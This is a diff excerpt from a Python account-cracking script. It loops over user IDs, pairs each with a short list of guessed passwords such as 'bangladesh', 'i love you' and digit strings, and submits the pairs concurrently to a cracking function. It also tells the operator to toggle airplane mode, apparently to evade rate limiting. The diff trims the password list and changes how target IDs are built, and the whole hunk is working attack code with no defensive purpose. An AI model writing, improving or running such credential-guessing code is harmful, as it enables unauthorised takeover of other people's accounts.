@@ -219,8 +219,8 @@ def i():
         jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025']
-            uid = uid+love
+            pwx = [love,'bangladesh','i love you','203040','121234','708090','Bangladesh','0987654']
+            uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
  
